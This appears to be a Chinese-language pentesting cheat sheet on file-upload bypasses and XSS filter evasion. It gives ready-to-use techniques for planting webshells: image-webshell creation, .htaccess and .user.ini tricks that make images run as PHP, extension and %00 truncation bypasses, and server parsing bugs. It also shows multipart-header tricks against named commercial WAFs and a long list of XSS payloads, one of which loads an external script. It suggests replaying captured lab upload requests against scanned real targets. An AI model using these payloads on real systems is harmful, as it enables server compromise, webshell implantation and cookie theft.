产生原因：
对于上传文件的后缀名（扩展名）没有做较为严格的限制

对于上传文件的MIMETYPE(用于描述文件的类型的一种表述方法)没有做检查

权限上没有对于上传的文件目录设置不可执行权限，（尤其是对于shebang类型的文件）

对于web server对于上传文件或者指定目录的行为没有做限制比如没有重命名  

webshell简介  
如果说我们扫描出文件上传的接口 如何利用  

/upload  
upload_file  
upload  
uploadfile  
filen_ame  
name  

直接找一个上传漏洞靶场，然后进行上传包的抓取，之后将主机信息进行修改，改为我们扫描出来的目标地址接口，进行替换，如果失败可以将filename哪里进行，fuzz一下。

-----
图片马的制作  
使用 copy 2.jpg/b+2.php 22.jpg 制作出图片马  
对方网址必须存在 文件包含漏洞 或 解析漏洞才可以利用  

------
原理很简单，难的是绕过限制  

1 前端js检测绕过思路  
抓包修改 当上传点是通过前端代码进行检测时，我们可以通过将 shell.php 重命名为 shell.png 上传抓包的时候再将文件名修改为 shell.php 即可绕过前段限制，成功上传 webshell。  

因为是前端js审，还可F12 删js代码、禁用js

2 MIME Contnet-type检测绕过  
常见文件MIME  
.jpg	image/jpeg  
.gif	image/gif  
.png	image/png  
.txt	text/plain  
.word	application/msword  
.html	text/html  
.*(二进制流，位置文件类型)	application/octet-stream  

3 文件头检测绕过  
常见的文件头  
JPEG (jpg)，文件头：FFD8FF  
PNG (png)，文件头：89504E47  
GIF (gif)，文件头：47494638  
● GIF87a版本文件头：47 49 46 38 37 61  
● GIF89a版本文件头：47 49 46 38 39 61  
TIFF (tif)，文件头：49492A00  
Windows Bitmap (bmp)，文件头：424D  
<img width="1154" height="572" alt="image" src="https://github.com/user-attachments/assets/be35699f-8bb9-4b7f-9347-7f12f2113124" />

4 黑名单限制绕过  
不允许传html\php等  
Windows特性  
（NTFS 交换数据流::$DATA 绕过上传，小数点，利用 windows 环境的叠加特征绕过上传）  
小数点  
空格  
双写  
大小写  
特殊后缀   
.htaccess  
.user.ini  
. .  

------
下面详细展开讲解  
1 特殊后缀  
php

php2  
php3  
php4  
php5  
php6  
php7  
phtinc  
phps  
phar  
pht  
pgif  
phtm  
phtml  
shtmlhtml  
htm  


Java/JSP 后缀

jsp  
jsw  
jsv  
jspa  
jspf  
jspx  
jhtml  

ASP.NET 后缀

asp  
asa  
svc  
rem  
axd  
asax  
ascx  
asmx  
ceraspx  
ashx  
aspq  
soap  
xamlx   
cshtmvbhtm  
cshtml  
bhtml  

2 htaccess 重写解析绕过上传（中间件为apache 且不能有nginx）  
.htaccess可以帮我们实现包括：文件夹密码保护、用户自动重定向、自定义错误页面、改变你的文件扩展名、封禁特定IP地址的用户、只允许特定IP地址的用户、禁止目录列表，以及使用其他文件作为index文件等一些功能。  
启用.htaccess，需要修改httpd.conf，启用AllowOverride，并可以用AllowOverride限制特定命令的使用。如果需要使用.htaccess以外的其他文件名，可以用AccessFileName指令来改变。例如，需要使用.config ，则可以在服  务器配置文件中按以下方法配置：AccessFileName .config   

利用条件：Apache开启重写模块

传htaccess，使jpg按php解析    
<FilesMatch ".jpg">  
SetHandler application/x-httpd-php  
</FilesMatch>  

传图片马  

3 .user.ini.  
php环境 能传ini文件，目录必有一个能访问的php文件  

auto_prepend_file=a.jpg

.user.ini 配置项中有两个配置可以起到一些作用  
方法一：  
auto_prepend_file = <filename>         //包含在文件头  
方法二：  
auto_append_file = <filename>          //包含在文件尾  

4 大小写绕过  
有的上传模块 后缀名采用黑名单判断，但是没有对后缀名的大小写进行严格判断，导致可以更改后缀大小写可以被绕过。如 PHP、 Php、 phP、pHp，（在windows上有效）

5 双写后缀名绕过上传  
在文件上传时，有的代码会把黑名单的后缀名替换成空，例如 1.php 会把 php 替换成空，但是可以使用双写绕过例如 asaspp，pphphp，即可绕过上传。  

6空格绕过上传  
在上传模块里，采用黑名单上传，如果没有对空格进行去掉可能被绕过。  
trim()  

7 后缀加点绕过  
在 windows 中文件后缀名. 系统会自动忽略。所以 shell.php. 与 shell.php 的效果一样。所以可以在文件名后面加入 . 绕过。  

8 NTFS 交换数据流::$DATA 绕过上传  
如果后缀名没有对::$DATA 进行判断，利用 windows 系统 NTFS 特征可以绕过上传。  
利用 windows 环境的叠加特征绕过上传  
在 windwos 中如果上传文件名 1.php:.jpg 的时候，会在目录下生产空白的文件名 1.php，再利用 php 和 windows 环境的叠加属性，向 1.php 中写入内容  
以下符号在正则匹配时相等  
双引号" 等于 点号.  
大于符号> 等于 问号?  
小于符号< 等于 星号*  
将文件名写为1.>>> 将文件内容进行修改后再次上传   
1.>>>  

------
5白名单限制绕过  
00截断  
<img width="1247" height="1143" alt="image" src="https://github.com/user-attachments/assets/f5e828f4-98f1-404a-9a4a-e353c5a6de46" />

如果url中有路径就在url中进行截断，如果没有就在请求体的body的名字中进行%00的截断，但是如果在请求体中记得编码  
<img width="1219" height="1117" alt="image" src="https://github.com/user-attachments/assets/fa6f7253-79c0-48c6-85f5-c829e3175805" />

-----
解析漏洞  
上面是文件上传绕过传一句话木马，也可尝试传木马图（触发条件更困难）

1.解析漏洞

IIS  
IIS 5.x -6.x 解析漏洞   windows srver 2003   
只解asp文件，aspx是不解析  
xx.asp;jpg  
xx.asp/xx.jpg  

IIS 7.0 / 7.5  
xx.jpg/xx.php  
xx.jpg.php  

nginx 版本小于0.8.03  
xx.jpg/xx.php  
xx.jpg.php  

tomcat  
cve-2017-12615  

PUT /shell.jsp%20   
PUT /shell.jsp::$DATA   
PUT /shell.jsp/  
 
Apache  
未知后缀名解析  
1.x-2.x  
shell.php.aa.bb  

%0a换行符绕过  
CVE-2017-15715  
2.4.0-2.4.29  

2 文件包含路径上传  

3 文件上传条件竞争漏洞绕过  
在文件上传时，如果逻辑不对，会造成很大危害，例如文件上传时，用move_uploaded_file 把上传的临时文件移动到指定目录，  
接着再用 rename 文件设置为图片格式，如果在 rename 之前访问到这个文件，那我们就可以获取一个 webshell。  
利用条件
1.对方会先将上传的文件放入临时目录下，进行判断  
本质就是在上传的木马没有删除之前，进行一个访问触发（不停爆破）  
<img width="1209" height="1247" alt="image" src="https://github.com/user-attachments/assets/6ae05eaf-d324-4bbe-8f08-d9aaa3e72348" />

----
当已知waf厂商  
安全狗绕过  
1.绕过思路：对文件的内容，数据。数据包进行处理。  
关键点在这里
Content-Disposition: form-data; name="file"; filename="ian.php"  
将form-data;           修改为~form-data;  

2 大小写  
Content-Disposition: form-data; name="file"; filename="yjh.php"  
Content-Type: application/octet-stream  
将 Content-Disposition 修改为content-Disposition  
将 form-data           修改为Form-data  
将 Content-Type         修改为content-Type  

3 删减空格  
Content-Disposition: form-data; name="file"; filename="yjh.php"  
Content-Type: application/octet-stream  
将Content-Disposition: form-data         冒号后面 增加或减少一个空格  
将form-data; name="file";               分号后面 增加或减少一个空格  
将 Content-Type: application/octet-stream   冒号后面 增加一个空格  

4 字符串拼接  
看Content-Disposition: form-data; name="file"; filename="yjh3.php"  
将 form-data 修改为   f+orm-data  
将 from-data 修改为   form-d+ata  

5 双文件上传  
<form action="https://www.xxx.com/xxx.asp(php)" method="post"  
name="form1" enctype="multipart/form-data">  
<input name="FileName1" type="FILE" class="tx1" size="40">  
<input name="FileName2" type="FILE" class="tx1" size="40">  
<input type="submit" name="Submit" value="上传">  
</form>  

6.HTTP header 属性值绕过  
-Disposition: form-data; name="file"; filename="yjh.php"  
我们通过替换form-data 为*来绕过  
Content-Disposition: *; name="file"; filename="yjh.php"  

7 header属性名绕过  
源代码:
Content-Disposition: form-data; name="image";   
filename="085733uykwusqcs8vw8wky.png"Content-Type: image/png  
绕过内容如下：  
Content-Disposition: form-data; name="image";   
filename="085733uykwusqcs8vw8wky.png  
C.php"  
删除掉ontent-Type: image/jpeg只留下c，将.php加c后面即可，但是要注意额，双引号要跟着c.php".    

8 等效替换绕过  
原容：  
Content-Type: multipart/form-data; boundary=--------------------------  
-471463142114  
修改后:  
Content-Type: multipart/form-data; boundary =--------------------------  
-471463142114  
boundary后面加入空格。  

9 修改编码绕过  
使用UTF-16、Unicode、双URL编码等等  

10 ;;;;;;;;绕过
Content-Disposition: form-data;;;;;;; name="file";;;;;;;; filename="yjh.php"  

-----
WTS-WAF 绕过上传  
原内容：  
Content-Disposition: form-data; name="up_picture"; filename="xss.php"  
添加回车  
Content-Disposition: form-data; name="up_picture"; filename="xss.php"  

----
百度云上传绕过  
百度云绕过就简单的很多很多，在对文件名大小写上面没有检测php是过了的，Php就能过，或者PHP，    
一句话自己合成图片马用Xise连接即可。  
Content-Disposition: form-data; name="up_picture"; filename="xss.jpg .Php"  

----
阿里云上传绕过  
源代码：
Content-Disposition: form-data; name="img_crop_file"; filename="1.jpg   
.Php"Content-Type: image/jpeg  
修改如下：  
Content-Disposition: form-data; name="img_crop_file"; filename="1.php"  
没错，将=号这里回车删除掉Content-Type: image/jpeg即可绕过。  

----
360主机上传绕过  
源代码:  
Content-Disposition: form-dat a;name="image";   
filename="085733uykwusqcs8vw8wky.png"Content-Type: image/png  
绕过内容如下：  
Content- Disposition: form-data; name="image";   
filename="085733uykwusqcs8vw8wky.png  

加几个空格 删content-type  

-----
xss    
1 PDF-XSS  
1. 这里使用的是迅捷PDF编辑器（不是PDF转换器）。   
2. 从空白页新建文档。  

2 HTML-XSS  
<html>  
    <body>  
    <img src=1 onerror=alert("test")>  
    </body>  

</html>  

3 SVG-XSS  
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>  

---

xss分为反射型、存储型、dom型。  
常见过滤  

想法一  
过滤或转义payload会使用到的 单引号，双引号，尖括号  

想法二  
替换关键词使其语句失效 例如  
1. script 替换为 sc_ript 大小写 同义替换 编码（html，unicode）  
2. script 替换为 空 双写绕过  

想法三  
将语句中的空格都进行删除使其语句失效  

双引号html编码  
 " &quot;  
 < &lt;  
 > &gt;

过滤空格绕过  
/  
/**/  
*/alert/*  
/=><svg/onload=alert(1)>  
<script>/*  
*/(document/*  
*/.cookie)/*  
*/</script>  
换行绕过  
  %0d  
  %0a  
  %09  

过滤<>  
看位置有的位置不需要<>比如,<a hrfe="">1</a>,<input type="text" value="">  
使用unicode编码  
< \u003c > \u003e  
<还可以为\x3c >为\x3e  
使用url编码html编码进行绕过  

各种编码浏览器解码顺序为HTML解码 -> URL解码 -> js(unicode)解码HTML、js、进制编码  

<img width="1030" height="260" alt="image" src="https://github.com/user-attachments/assets/795c55d4-3bda-487f-81b0-631cdb9d6113" />

过滤标签属性函数  
fuzz其他可用的标签属性函数  
<a  
<img  
<svg  
<iframe  
<input  
<body  
<META  
<form  
也可以自己构造html标签  

大小写混合
双写
编码 比如将javascript中的t &#116;或者&#74;或者进行unicode编码,a编码为\u0061使用帽子的2版本进行转换最方便
同义替换（如果过滤了on可以使用href配合javascript伪协议）
脏数据（垃圾填充）

javascript://
javascript://%0aalert(1)

:-> html编码 &#x3a
<a href="javascript&#x3a;alert(1)//https://">test</a>
<a href="javascrip&#x74;:alert(1)">

最常见的方法  
(alert)(1)  
a=alert,a(1)  
alert(String.fromCharCode(49))  
[1].find(alert)  
window['al'+'ert'](/xss/)  
top["al"+"ert"](1)  
top[/al/.source+/ert/.source](1)  
aler\u0074(String.fr\u006fmCharC\u006fde(49))  
al\u0065rt(1)  
top['al\145rt'](1)  
top[8680439..toString(30)](1)  
eval(atob('YWxlcnQoMSk='))  
"top['ale'+'rt'].call(null,'xss')"  
al&#101;rt(2)   
top['al\x65rt'](1)  
[43804..toString(36)].some(confirm)  
window['eval']("\u0061\u006C\u0065\u0072\u0074\u0028\u0031\u0029"  

  #空白字符形式  
  alert%20(/xss/)  
  #回车换行  
  alert%0a(/xss/)  
  alert%0d(/xss/)  
  #缩进  
  alert%09(/xss/)  
  #注释  
  alert/*abcd*/(/xss/)  
  #注释换行  
  alert//abcd%0a(/xss/)  
  alert//abcd%0d(/xss/)  
  #括号分割  
  (alert)(/xss/)  
  ((alert))(/xss/)  
window和top调用  
  window.alert(0)  
  window['al'+'ert'](0)  
  top['al'+'ert'](0)  
  top.alert(0)  

垃圾填充  
<script>  
<script/123sad>  

<input onfocus=\u0061\u006C\u0065\u0072\u0074(1) autofocus><a href=javascript:\u0061\u006C\u0065\u0072\u0074(1)>Click</a>  

 如果不是闭合,单双引号都被禁,使用不要引号的方法（<img src=x onerror=alert(1)>,<input onfocus=alert(1)>）

单引号`'`被禁用双引号`"`  

反引号  
<svg/onload="window.onerror=eval;throw'=alert\x281\x29';">  
 
用斜杠`/`替换引号  
alert(/xss/)  

 单引号 双引号 ' --> \'  
 \'--> \\'  
 实现字符的逃逸  

 过滤（）  
 一般过滤的都是alert(1)这个整体想办法把他俩分开但是效果还是等效的  
括号被过滤  
<img src=1 onerror="window.onerror=eval;throw'=alert\x281\x29';">  

根据服务器特性进行双写大小写编码之类的还可以引入外部的js地址  
<svg/onload=s=createElement('script');body.appendChild(s);s.src='js地址'  

 后端过滤 \
<\s\c\r\i\p\t\>\a\l\e\r\t\(\)\<\/\s\c\r\i\p\t\>\

使用\转移'"的绕过方法  

单引号 双引号 ' --> \'  
 \'--> \\'  

https://brutelogic.com.br/gym.php?p16=\"-alert(1)//  

---

 input 标签  
 啥都没过滤
<input name=keyword  value="'"><123">
payload:" onclick="javascript:alert(1)
payload:" onclick="alert(1)
payload: a"onfocus=alert(1)//
payload:"><img src=x onerror=alert(1)>
payload:" <img src=x onerror=alert(1)>

过滤"<> -> 对这三个符号进行html编码的方式进行过滤
?keyword=' onclick='javascript:alert(1)
payload:' onclick='javascript:alert(1)

过滤 <> -> 对这两个符号进行替换为空
<input name=keyword  value="'"123">
paylaod:" onclick="javascript:alert(1)

"><'都没过滤就是打不通
正常打payload之后搜索payload看是对什么进行了过滤
<input name=keyword  value="" o_nclick="javascript:alert(1)">
清楚的看到是对on进行了过滤
既然on事件不能触发就得考虑闭合标签应用a参数的href属性
<input name=keyword  value=""><a hr_ef='javascript:alert(1)'>">
对href也进行了替换此时同意替换就不好用了考虑绕过
直接大小写过"><a Href='javascript:alert(1)'>

那就先进行事件的fuzz之后，再进行函数的fuzz
<input name=keyword  value="'"><123">
使用这个paylaod进行fuzz " onclick="javascript:alert(1) 先替换事件fuzz
fuzz之后发现长度都一样
再进行函数的替换发现长度也一样
考虑替换另一种payload
"><img src=x onerror=alert(1)>
之后肯定也不是标签的
发现共同点是都有on考虑过滤on所以直接换一种类型的payload
payload:"><a href='javascript:alert(1)'>

打入payload " onclick="javascript:alert(1)
<input name=keyword  value="" click="java:alert(1)">
" oonnclick="javascrscriptipt:alert(1)

把我们的关键字替换为空考虑双写

"闭合但是把双引号给过滤了
<a href="'&quot<>123">

但是我们再href里面或许我们不需要"直接使用javascript伪协议进行尝试
javascript:alert(1)
<center><BR><a href="javascr_ipt:alert(1)">
很好进行了过滤尝试大小写过不了
进行编码尝试
十进制实体编码：javascrip&#116;:alert(1)
十六进制实体编码：javascrip&#x74;:alert(1)本质也是html编码

这个编码后html页面是不会变的所以直接点击看效果就行

<input name=keyword  value="'&quot;&lt;&gt;123">

 ---
 
